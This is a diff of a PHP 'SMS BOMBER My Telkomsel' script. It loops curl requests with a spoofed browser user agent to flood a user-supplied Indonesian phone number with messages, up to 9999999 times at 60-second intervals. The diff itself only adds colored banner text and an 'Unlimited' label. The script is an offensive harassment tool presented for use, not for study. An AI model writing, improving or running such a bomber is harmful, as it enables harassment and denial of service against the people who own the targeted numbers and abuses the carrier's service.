@@ -11,16 +11,17 @@ function telkbomb($no, $jum, $wait){
         curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
         $server_output = curl_exec ($ch);
         curl_close ($ch);
-        echo $server_output."\n";
+        echo $server_output."\n<font color="green">Delay : 60 Second</font>\n";
         sleep($wait);
         $x++;
         flush();
     }
 }
-print "SMS BOMBER My Telkomsel\n";
-print ".Koe Nurf.\n\n\n";
+print "\n\n<font color="red">SMS BOMBER My Telkomsel</font>\n";
+print "<font color="blue">Unlimited</font>\n";
+print "<font color="green">.Koe Nurf.</font>\n\n\n";
 
-echo "Nomor? (eg : 628xxx)\nInput : ";
+echo "Nomor (eg : 628xxx)\nInput : ";
 $nomor = trim(fgets(STDIN));
 $jumlah = "9999999";
 $jeda = "60";
